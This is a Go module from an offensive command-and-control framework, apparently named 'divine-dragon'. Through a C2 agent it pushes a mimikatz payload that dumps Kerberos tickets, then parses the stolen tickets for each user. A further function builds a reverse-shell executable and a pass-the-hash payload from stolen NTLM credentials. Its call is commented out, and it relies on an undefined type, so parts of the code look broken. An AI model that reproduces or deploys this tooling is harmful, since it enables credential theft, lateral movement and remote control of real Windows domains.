package local_exploit

import (
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"
	"time"
)

type PassTheTicketModule struct {
	c2m           *c2.C2Module
	agentUuid     string
	listenHost    string
	listenPort    string
	dumpedTickets []dumpedTickets
	logger        util.Logger
}

func NewPassTheTicketModule(c2mOpt *c2.C2Module, agentUuidOpt, listenHostOpt, listenPortOpt string) *PassTheTicketModule {
	pttm := PassTheTicketModule{
		c2m:        c2mOpt,
		agentUuid:  agentUuidOpt,
		listenHost: listenHostOpt,
		listenPort: listenPortOpt,
	}
	pttm.logger = util.PassTheTicketLogger(true, "")
	pttm.dumpedTickets = []dumpedTickets{}
	return &pttm
}

func (pttm *PassTheTicketModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pttm.c2m.GetC2Hostname(), pttm.c2m.GetC2Port(), "mimikatz_ticketdump", "windows", "amd64", "mimikatz_ticketdump.exe")
	stpgm.Run()

	jobUuid, err := pttm.c2m.AddJob(pttm.agentUuid, "mimikatz_ticketdump.exe")
	if err != nil {
		pttm.logger.Log.Error(err)
		return
	}
	pttm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pttm.c2m.GetAllAgentJobs(pttm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pttm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pttm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		pttm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			pttm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			pttm.logger.Log.Info("Checking SeDebugPrivilege token...")
			if strings.Contains(results[jobUuid], "Privilege '20' OK") {
				pttm.logger.Log.Notice("SeDebugPrivilege is set.")
				pttm.ParseResults(results[jobUuid])
				pttm.PrintParsedResults()

				// fmt.Println("Type a username to execute Pass The Ticket attack in format DOMAIN\\USERNAME:")
				// fmt.Println()
				// scanner := bufio.NewScanner(os.Stdin)
				// var selected dumpedUser
				// for scanner.Scan() {
				// 	username := scanner.Text()
				// 	formattedUsername := util.FormatCommand(username)
				// 	if strings.Compare(formattedUsername, "quit") == 0 || strings.Compare(formattedUsername, "exit") == 0 {
				// 		return
				// 	} else {
				// 		splittedUsername := strings.Split(formattedUsername, "\\")
				// 		if len(splittedUsername) == 2 {
				// 			selectedUsername := splittedUsername[1]
				// 			selectedDomain := splittedUsername[0]
				// 			foundUsername := false
				// 			for _, dumpedUser := range pttm.dumpedUsers {
				// 				if selectedUsername == dumpedUser.Username && selectedDomain == dumpedUser.Domain {
				// 					selected = dumpedUser
				// 					foundUsername = true
				// 				}
				// 			}
				// 			if foundUsername {
				// 				break
				// 			}
				// 		} else {
				// 			pttm.logger.Log.Error("Your input incorrect. Try again.\n")
				// 		}
				// 	}
				// }
				// pttm.RunPthWithReverseShell(selected)
			} else {
				pttm.logger.Log.Error("Agent is running as user without SeDebugPrivilege.")
			}
		}
	}
}

type dumpedTickets struct {
	Username      string
	Domain        string
	Server        string
	Time          string
	SID           string
	TGSTickets    []Ticket
	ClientTickets []Ticket
	TGTTickets    []Ticket
}

type Ticket struct {
	Start       string
	End         string
	MaxRenew    string
	ServiceName string
	TargetName  string
	ClientName  string
	Filename    string
}

func (pttm *PassTheTicketModule) ParseResults(results string) {
	identities := strings.Split(results, "Authentication Id")
	for _, identity := range identities {
		if strings.Contains(identity, "Group") {
			fmt.Println("======")
			fmt.Println(identity)
			identityProperties := strings.Split(identity, "\r\n")
			username := strings.Trim(strings.Split(identityProperties[2], ":")[1], " ")
			domain := strings.Trim(strings.Split(identityProperties[3], ":")[1], " ")
			server := strings.Trim(strings.Split(identityProperties[4], ":")[1], " ")
			time := strings.Trim(strings.Split(identityProperties[5], ":")[1], " ")
			sid := strings.Trim(strings.Split(identityProperties[6], ":")[1], " ")
			fmt.Println(username, domain, server, time, sid)
			tickets := strings.Join(identityProperties[12:len(identityProperties)-1], "\n")
			zeroGroupInd := strings.Index(tickets, "Group 0")
			firstGroupInd := strings.Index(tickets, "Group 1")
			secondGroupInd := strings.Index(tickets, "Group 2")
			tgsTicketsString := tickets[zeroGroupInd:firstGroupInd]
			clientTicketsString := tickets[firstGroupInd:secondGroupInd]
			mimikatzGarbageInd := strings.Index(tickets, "mimikatz(commandline) #")
			var tgtTicketsString string
			if mimikatzGarbageInd != -1 {
				tgtTicketsString = tickets[secondGroupInd:mimikatzGarbageInd]
			} else {
				tgtTicketsString = tickets[secondGroupInd:]
			}
			var tgs []Ticket
			tgsTickets := strings.Split(tgsTicketsString, "\n")
			if len(tgsTickets) > 3 {
				tgs = pttm.ParseTicketGroup(tgsTickets[2:])
			} else {
				tgs = []Ticket{}
			}
			var client []Ticket
			clientTickets := strings.Split(clientTicketsString, "\n")
			if len(clientTickets) > 3 {
				client = pttm.ParseTicketGroup(clientTickets[2:])
			} else {
				client = []Ticket{}
			}
			var tgt []Ticket
			tgtTickets := strings.Split(tgtTicketsString, "\n")
			if len(tgtTickets) > 3 {
				tgt = pttm.ParseTicketGroup(tgtTickets[2:])
			} else {
				tgt = []Ticket{}
			}
			pttm.dumpedTickets = append(pttm.dumpedTickets, dumpedTickets{username, domain, server, time, sid, tgs, client, tgt})
		}
	}
}

func (pttm *PassTheTicketModule) PrintParsedResults() {
	if len(pttm.dumpedTickets) > 0 {
		pttm.logger.Log.Notice("Found some tickets. Printing out...")
		fmt.Println()
		w := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', 0)
		for _, dumpedTicket := range pttm.dumpedTickets {
			if len(dumpedTicket.TGSTickets) > 0 || len(dumpedTicket.ClientTickets) > 0 || len(dumpedTicket.TGTTickets) > 0 {
				fmt.Fprintln(w, "-----")
				fmt.Fprintln(w)
				fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\n\n", dumpedTicket.Username, dumpedTicket.Domain, dumpedTicket.Server, dumpedTicket.Time, dumpedTicket.SID)
				if len(dumpedTicket.TGSTickets) > 0 {
					fmt.Fprint(w, "TGS Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.TGSTickets)
				}
				if len(dumpedTicket.ClientTickets) > 0 {
					fmt.Fprint(w, "Client Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.ClientTickets)
				}
				if len(dumpedTicket.TGTTickets) > 0 {
					fmt.Fprint(w, "TGT Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.TGTTickets)
				}
				fmt.Fprint(w, "\n")
			}
		}
		w.Flush()
		fmt.Println()
	}
}

func (pttm *PassTheTicketModule) PrintParsedTickets(w *tabwriter.Writer, tickets []Ticket) {
	for _, ticket := range tickets {
		fmt.Fprintf(w, "\tStart/End/MaxRenew: %s\t%s\t%s\n", ticket.Start, ticket.End, ticket.MaxRenew)
		fmt.Fprintf(w, "\tServiceName: %s\n", ticket.ServiceName)
		fmt.Fprintf(w, "\tTargetName: %s\n", ticket.TargetName)
		fmt.Fprintf(w, "\tClientName: %s\n\n", ticket.ClientName)
	}
}

func (pttm *PassTheTicketModule) RunPthWithReverseShell(selected dumpedUser) {
	pttm.logger.Log.Infof("Don't forget to start a listener on %s:%s", pttm.listenHost, pttm.listenPort)
	pttm.logger.Log.Info("Generating a Reverse Shell payload...")
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pttm.listenHost, pttm.listenPort, "reverse_shell", "windows", "amd64", "revshell.exe")
	stpgm.Run()
	pttm.logger.Log.Info("Done")
	pttm.logger.Log.Info("Generating a Pass The Hash payload...")
	stpgm = payload_generator.NewStageTwoPayloadGeneratorModule(pttm.c2m.GetC2Hostname(), pttm.c2m.GetC2Port(), "mimikatz_pth_reverse_shell", "windows", "amd64", "mimikatz_pth_reverse_shell.exe")
	stpgm.SetPthParams(selected.Username, selected.Domain, selected.NTLM)
	stpgm.Run()
	pttm.logger.Log.Info("Done")
	jobUuid, err := pttm.c2m.AddJob(pttm.agentUuid, "mimikatz_pth_reverse_shell.exe")
	if err != nil {
		pttm.logger.Log.Error(err)
		return
	}
	pttm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pttm.c2m.GetAllAgentJobs(pttm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pttm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
	} else {
		pttm.logger.Log.Info("Job's completed. You supposed to be getting a PS reverse shell.")
	}
}

func (pttm *PassTheTicketModule) ParseTicketGroup(tickets []string) []Ticket {
	fmt.Println("****************************")
	fmt.Println(tickets)
	fmt.Println("****************************")
	userTickets := []Ticket{}
	tgsTickets := strings.Split(strings.Join(tickets, "\n"), "Start")
	for _, tgsTicket := range tgsTickets[1:] {
		fmt.Println("//////////////////////////////")
		newTicket := Ticket{}
		splittedTicket := strings.Split(tgsTicket, "\n")
		delimiterInd := strings.Index(splittedTicket[0], ":")
		dates := strings.Split(splittedTicket[0][delimiterInd:], ";")
		fmt.Println("dates =", dates)
		newTicket.Start = dates[0]
		newTicket.End = dates[1]
		newTicket.MaxRenew = dates[2]
		serviceName := strings.Split(strings.Split(splittedTicket[1], ":")[1], ";")
		fmt.Println("serviceName =", serviceName)
		newTicket.ServiceName = strings.Join(serviceName, "/")
		targetName := strings.Split(strings.Split(splittedTicket[2], ":")[1], ";")
		fmt.Println("clientName =", targetName)
		newTicket.TargetName = strings.Join(targetName, "/")
		clientName := strings.Split(strings.Split(splittedTicket[3], ":")[1], ";")
		fmt.Println("targetName =", clientName)
		newTicket.ClientName = strings.Join(clientName, "/")
		fmt.Println("splittedTicket[8] =", splittedTicket[8])
		filenameStart := strings.Index(splittedTicket[8], "[")
		filenameEnd := strings.Index(splittedTicket[8], "!")
		newTicket.Filename = splittedTicket[8][filenameStart : filenameEnd-1]
		userTickets = append(userTickets, newTicket)
	}
	return userTickets
}
